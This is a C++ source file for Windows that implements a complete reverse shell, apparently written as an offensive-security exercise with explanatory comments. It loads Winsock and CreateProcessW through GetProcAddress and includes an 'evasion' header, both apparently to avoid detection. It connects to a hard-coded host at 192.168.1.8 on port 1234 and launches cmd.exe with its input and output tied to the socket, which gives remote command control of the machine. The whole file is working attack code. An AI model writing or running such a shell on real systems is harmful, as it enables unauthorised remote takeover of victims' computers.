#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include "includes/evasion.h"

// Create type alias for dynamically loading Windows API functions.
// Declare the parameters so the compiler knows the exact signature of function
using pWSAStartup = INT ( WINAPI * ) (
    WORD,
    LPWSADATA
);

using pWSASocketA = SOCKET ( WSAAPI * ) (
    int, 
    int, 
    int,
    LPWSAPROTOCOL_INFOA,
    GROUP,
    DWORD
);

using pWSAConnect = INT ( WSAAPI * ) (
  SOCKET, 
  const struct sockaddr *,
  int,
  LPWSABUF,
  LPWSABUF,
  LPQOS,
  LPQOS
);

using pCreateProcessW = BOOL ( WINAPI * ) (
  LPCWSTR,
  LPWSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL,
  DWORD,
  LPVOID,
  LPCWSTR,
  LPSTARTUPINFOW,
  LPPROCESS_INFORMATION
);

int main() {
  // Return a handle to Kernel32, so we can dynamically load WinAPI functions
  HMODULE Handle_Kernel32 = GetModuleHandleW ( L"kernel32.dll" );
  
  if ( Handle_Kernel32 == NULL ) {
    std::cout << "Error M1: " << GetLastError() << '\n'; 
    return EXIT_FAILURE;
  }

  // Return a handle from Winsock API
  HMODULE Handle_WS2  = LoadLibraryW ( L"ws2_32.dll" );
  
  if ( Handle_WS2 == NULL ) {
    std::cout << "Error M2: " << GetLastError() << '\n';
    return EXIT_FAILURE;
  }

  // Once we got a handle to both Kernel32, and Winsock APi we can get a pointer to the specific functions we want to dynamically load using GetProcAddress
  pWSAStartup      dWSAStartup     = ( pWSAStartup     ) GetProcAddress ( Handle_WS2,       "WSAStartup"     );
  pWSASocketA      dWSASocketA     = ( pWSASocketA     ) GetProcAddress ( Handle_WS2,       "WSASocketA"     );
  pWSAConnect      dWSAConnect     = ( pWSAConnect     ) GetProcAddress ( Handle_WS2,       "WSAConnect"     );
  pCreateProcessW  dCreateProcessW = ( pCreateProcessW ) GetProcAddress ( Handle_Kernel32,  "CreateProcessW" );

  // Declare a structure for the host's connection info
  struct Host {

    const int port             { 1234 };
    std::string_view ipAddress { "192.168.1.8" };

  } host;

  // Networking data that we have to initialize, and pass
  struct Networking {

    WSADATA              wsaData;             // Windows socket structure
    SOCKET               windowsSocket;       // Network socket (Network handle)
    struct sockaddr_in   socketAddress;       // IPv4 address structure that defines our host's IP and port
    STARTUPINFOW         startupInformation;  // Structure for CreateProcessW that would specify how our new process would start
    PROCESS_INFORMATION  processInformation;  // Structure for process information, we're going to use this for CreateProcessW again

  } net;

  // Initialize Winsock, so we can use network functions (socket)
  if ( dWSAStartup ( MAKEWORD ( 2,2 ), &net.wsaData ) != 0) {
    std::cout << "Error M3: " << WSAGetLastError() << '\n';
  }

  // Create a socket handle and specify IPv4, and TCP protocol
  net.windowsSocket = dWSASocketA(
    AF_INET,      
    SOCK_STREAM,  
    IPPROTO_TCP,  
    NULL,
    0,
    0
  );

  if ( net.windowsSocket == INVALID_SOCKET ) {
    std::cout << "Error M4: " << WSAGetLastError() << '\n';
    return EXIT_FAILURE;
  }

  // Pass our host's information to the IPv4 structure
  net.socketAddress.sin_family      = AF_INET;
  net.socketAddress.sin_port        = htons     ( host.port             );
  net.socketAddress.sin_addr.s_addr = inet_addr ( host.ipAddress.data() );

  // Connect to our host after passign the information to the structure
  if (dWSAConnect (
      net.windowsSocket,
      ( SOCKADDR * )&net.socketAddress,
      sizeof( net.socketAddress ),
      NULL,
      NULL,
      NULL,
      NULL
    ) == SOCKET_ERROR)

  {
    std::cout << "Error M5:" << WSAGetLastError() << '\n';
    return EXIT_FAILURE;
  }

  // Clear the memory of process structure's information to remove garbage values
  SecureZeroMemory( &net.startupInformation, sizeof( net.startupInformation ) );

  // Assign the scoket handle, so the new process will read input from and write output to the socket
  net.startupInformation.cb         =  sizeof( net.startupInformation );
  net.startupInformation.hStdInput  =      ( HANDLE ) net.windowsSocket;
  net.startupInformation.hStdOutput =      ( HANDLE ) net.windowsSocket;
  net.startupInformation.hStdError  =      ( HANDLE ) net.windowsSocket;
  net.startupInformation.dwFlags    =              STARTF_USESTDHANDLES;

  std::wstring cmd { L"cmd.exe" };

  // Spawn the specific cmd.exe process
  if (!dCreateProcessW(
    NULL,
    cmd.data(),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    &net.startupInformation,
    &net.processInformation
    ))
    
  {
    std::cout << "Error M6: " << GetLastError() << '\n';
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}
